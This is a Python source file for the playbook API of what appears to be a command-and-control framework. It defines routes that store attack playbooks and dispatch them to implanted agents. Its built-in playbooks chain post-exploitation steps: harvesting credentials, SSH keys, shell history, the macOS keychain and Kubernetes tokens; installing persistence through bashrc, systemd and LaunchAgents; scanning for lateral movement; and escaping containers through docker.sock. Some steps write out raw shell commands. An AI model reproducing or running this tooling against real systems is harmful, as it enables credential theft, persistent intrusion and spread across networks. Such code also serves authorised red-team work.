"""
Playbook API — Phase 10
CRUD for operator-defined (and built-in) attack chain playbooks,
plus execution dispatch and history.
"""

import json
import uuid
from datetime import datetime
from typing import List, Optional

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session

from core.auth import get_current_operator
from db.database import get_db
from models.playbook import Playbook, PlaybookExecution
from models.task import Task as TaskModel

router = APIRouter(prefix="/api/playbooks", tags=["playbooks"])

# ── Built-in playbooks ────────────────────────────────────────────────────────

_BUILTIN: list[dict] = [
    {
        "name": "quick-recon",
        "description": "Fast initial reconnaissance — sysinfo, users, processes, network state",
        "category": "recon",
        "tags": ["recon", "passive", "safe"],
        "steps": [
            {"id": "1", "name": "System Info",           "command": "sysinfo",  "on_fail": "continue"},
            {"id": "2", "name": "Current User",          "command": "whoami",   "on_fail": "continue"},
            {"id": "3", "name": "Process List",          "command": "ps",       "on_fail": "continue"},
            {"id": "4", "name": "Network Connections",   "command": "netstat",  "on_fail": "continue"},
            {"id": "5", "name": "Network Interfaces",    "command": "ifconfig", "on_fail": "continue"},
            {"id": "6", "name": "Environment Variables", "command": "env",      "on_fail": "continue"},
        ],
    },
    {
        "name": "privesc-hunter",
        "description": "PrivEsc enumeration for Linux and macOS — SUID, sudo, capabilities, cron",
        "category": "privesc",
        "tags": ["privesc", "linux", "macos"],
        "steps": [
            {"id": "1", "name": "Sysinfo",            "command": "sysinfo",        "on_fail": "continue"},
            {"id": "2", "name": "Linux PrivEsc",      "command": "linux-privesc",  "on_fail": "continue"},
            {"id": "3", "name": "macOS PrivEsc",      "command": "darwin-privesc", "on_fail": "continue"},
            {"id": "4", "name": "SUID Binaries",      "command": "shell find / -perm -4000 -type f 2>/dev/null | head -30", "on_fail": "continue"},
            {"id": "5", "name": "Sudo Permissions",   "command": "shell sudo -l 2>&1",  "on_fail": "continue"},
            {"id": "6", "name": "Container Check",    "command": "container-check", "on_fail": "continue"},
        ],
    },
    {
        "name": "cred-sweep",
        "description": "Full credential sweep — cloud creds, SSH keys, shell history, keychain, K8s SA token",
        "category": "creds",
        "tags": ["creds", "harvest", "cloud"],
        "steps": [
            {"id": "1", "name": "Credential Harvest", "command": "creds",           "on_fail": "continue"},
            {"id": "2", "name": "SSH Key Files",      "command": "shell find ~/.ssh -type f 2>/dev/null | xargs ls -la 2>/dev/null", "on_fail": "continue"},
            {"id": "3", "name": "Shell History",      "command": "shell (cat ~/.bash_history 2>/dev/null || cat ~/.zsh_history 2>/dev/null) | tail -50", "on_fail": "continue"},
            {"id": "4", "name": "macOS Keychain",     "command": "darwin-keychain", "on_fail": "continue"},
            {"id": "5", "name": "Container Check",    "command": "container-check", "on_fail": "continue"},
            {"id": "6", "name": "K8s SA Token",       "command": "k8s-sa-token",    "on_fail": "continue"},
        ],
    },
    {
        "name": "full-persist",
        "description": "Install and verify persistence on Linux, macOS, or Windows targets",
        "category": "persist",
        "tags": ["persistence", "stealth"],
        "steps": [
            {"id": "1", "name": "Sysinfo",                 "command": "sysinfo",                 "on_fail": "abort"},
            {"id": "2", "name": "Current User",            "command": "whoami",                  "on_fail": "continue"},
            {"id": "3", "name": "Generic Persist",         "command": "persist",                 "on_fail": "continue"},
            {"id": "4", "name": "Linux Bashrc",            "command": "linux-persist-bashrc",    "on_fail": "continue"},
            {"id": "5", "name": "Linux Systemd",           "command": "linux-persist-systemd",   "on_fail": "continue"},
            {"id": "6", "name": "macOS LaunchAgent",       "command": "darwin-launchd",          "on_fail": "continue"},
            {"id": "7", "name": "Verify Persist (Linux)",  "command": "linux-persist-list",      "on_fail": "continue"},
        ],
    },
    {
        "name": "lateral-prep",
        "description": "Network discovery and lateral movement preparation — ARP, host scan, port scan",
        "category": "lateral",
        "tags": ["lateral", "network", "recon"],
        "steps": [
            {"id": "1", "name": "Network Interfaces", "command": "ifconfig",   "on_fail": "continue"},
            {"id": "2", "name": "ARP Table",          "command": "arp",        "on_fail": "continue"},
            {"id": "3", "name": "Active Connections", "command": "netstat",    "on_fail": "continue"},
            {"id": "4", "name": "Host Discovery",     "command": "hostscan",   "on_fail": "continue"},
            {"id": "5", "name": "Port Scan",          "command": "portscan",   "on_fail": "continue"},
        ],
    },
    {
        "name": "container-escape",
        "description": "Container environment detection and breakout via docker.sock or K8s SA token",
        "category": "container",
        "tags": ["container", "escape", "k8s", "docker"],
        "steps": [
            {"id": "1", "name": "Container Check",    "command": "container-check",  "on_fail": "continue"},
            {"id": "2", "name": "Docker Escape",      "command": "docker-escape",    "on_fail": "continue"},
            {"id": "3", "name": "K8s SA Token",       "command": "k8s-sa-token",     "on_fail": "continue"},
            {"id": "4", "name": "K8s Enum Pods",      "command": "k8s-enum-pods",    "on_fail": "continue"},
            {"id": "5", "name": "Sysinfo (host)",     "command": "sysinfo",          "on_fail": "continue"},
        ],
    },
]


def _seed(db: Session) -> None:
    if db.query(Playbook).filter(Playbook.built_in.is_(True)).first():
        return
    for p in _BUILTIN:
        db.add(Playbook(
            id=str(uuid.uuid4()),
            name=p["name"],
            description=p["description"],
            category=p["category"],
            steps=json.dumps(p["steps"]),
            tags=json.dumps(p["tags"]),
            built_in=True,
        ))
    db.commit()


def _serialize(pb: Playbook) -> dict:
    return {
        "id": pb.id,
        "name": pb.name,
        "description": pb.description,
        "category": pb.category,
        "steps": json.loads(pb.steps or "[]"),
        "tags": json.loads(pb.tags or "[]"),
        "built_in": pb.built_in,
        "created_at": pb.created_at.isoformat() if pb.created_at else None,
    }


# ── Pydantic schemas ──────────────────────────────────────────────────────────

class StepSchema(BaseModel):
    id: str
    name: str
    command: str
    on_fail: str = "continue"


class PlaybookCreate(BaseModel):
    name: str
    description: str = ""
    category: str = "recon"
    steps: List[StepSchema]
    tags: List[str] = []


class PlaybookUpdate(BaseModel):
    name: Optional[str] = None
    description: Optional[str] = None
    category: Optional[str] = None
    steps: Optional[List[StepSchema]] = None
    tags: Optional[List[str]] = None


# ── Routes ────────────────────────────────────────────────────────────────────

@router.get("/executions")
def list_executions(
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    rows = (
        db.query(PlaybookExecution)
        .order_by(PlaybookExecution.started_at.desc())
        .limit(200)
        .all()
    )
    out = []
    for e in rows:
        task = db.query(TaskModel).filter(TaskModel.id == e.task_id).first() if e.task_id else None
        # Update status from task if still running
        if task and e.status == "running" and task.status in ("completed", "failed"):
            e.status = task.status
            if task.completed_at:
                e.finished_at = task.completed_at
            db.commit()
        out.append({
            "id": e.id,
            "playbook_id": e.playbook_id,
            "playbook_name": e.playbook_name,
            "agent_id": e.agent_id,
            "status": e.status,
            "task_id": e.task_id,
            "task_status": task.status if task else None,
            "task_output": task.output if task else None,
            "started_at": e.started_at.isoformat() if e.started_at else None,
            "finished_at": e.finished_at.isoformat() if e.finished_at else None,
        })
    return out


@router.get("/executions/{exec_id}")
def get_execution(
    exec_id: str,
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    exe = db.query(PlaybookExecution).filter(PlaybookExecution.id == exec_id).first()
    if not exe:
        raise HTTPException(status_code=404, detail="Execution not found")
    task = db.query(TaskModel).filter(TaskModel.id == exe.task_id).first() if exe.task_id else None
    return {
        "id": exe.id,
        "playbook_id": exe.playbook_id,
        "playbook_name": exe.playbook_name,
        "agent_id": exe.agent_id,
        "status": exe.status,
        "task_id": exe.task_id,
        "task_status": task.status if task else None,
        "task_output": task.output if task else None,
        "started_at": exe.started_at.isoformat() if exe.started_at else None,
        "finished_at": exe.finished_at.isoformat() if exe.finished_at else None,
    }


@router.get("/")
def list_playbooks(
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    _seed(db)
    rows = (
        db.query(Playbook)
        .order_by(Playbook.built_in.desc(), Playbook.created_at)
        .all()
    )
    return [_serialize(r) for r in rows]


@router.get("/{pb_id}")
def get_playbook(pb_id: str, db: Session = Depends(get_db)):
    # No auth — agent fetches this endpoint without a bearer token
    pb = db.query(Playbook).filter(Playbook.id == pb_id).first()
    if not pb:
        raise HTTPException(status_code=404, detail="Playbook not found")
    return _serialize(pb)


@router.post("/")
def create_playbook(
    data: PlaybookCreate,
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    pb = Playbook(
        name=data.name,
        description=data.description,
        category=data.category,
        steps=json.dumps([s.model_dump() for s in data.steps]),
        tags=json.dumps(data.tags),
        built_in=False,
    )
    db.add(pb)
    db.commit()
    db.refresh(pb)
    return _serialize(pb)


@router.put("/{pb_id}")
def update_playbook(
    pb_id: str,
    data: PlaybookUpdate,
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    pb = db.query(Playbook).filter(Playbook.id == pb_id, Playbook.built_in.is_(False)).first()
    if not pb:
        raise HTTPException(status_code=404, detail="Playbook not found or is built-in")
    if data.name is not None:
        pb.name = data.name
    if data.description is not None:
        pb.description = data.description
    if data.category is not None:
        pb.category = data.category
    if data.steps is not None:
        pb.steps = json.dumps([s.model_dump() for s in data.steps])
    if data.tags is not None:
        pb.tags = json.dumps(data.tags)
    db.commit()
    return _serialize(pb)


@router.delete("/{pb_id}")
def delete_playbook(
    pb_id: str,
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    pb = db.query(Playbook).filter(Playbook.id == pb_id, Playbook.built_in.is_(False)).first()
    if not pb:
        raise HTTPException(status_code=404, detail="Playbook not found or is built-in (cannot delete)")
    db.delete(pb)
    db.commit()
    return {"deleted": True}


@router.post("/{pb_id}/run")
def run_playbook(
    pb_id: str,
    agent_id: str,
    db: Session = Depends(get_db),
    _: str = Depends(get_current_operator),
):
    pb = db.query(Playbook).filter(Playbook.id == pb_id).first()
    if not pb:
        raise HTTPException(status_code=404, detail="Playbook not found")

    task = TaskModel(agent_id=agent_id, command=f"playbook-run {pb_id}")
    db.add(task)
    db.commit()
    db.refresh(task)

    exe = PlaybookExecution(
        playbook_id=pb_id,
        playbook_name=pb.name,
        agent_id=agent_id,
        status="running",
        task_id=task.id,
    )
    db.add(exe)
    db.commit()
    db.refresh(exe)

    return {
        "execution_id": exe.id,
        "task_id": task.id,
        "playbook": pb.name,
        "agent_id": agent_id,
    }
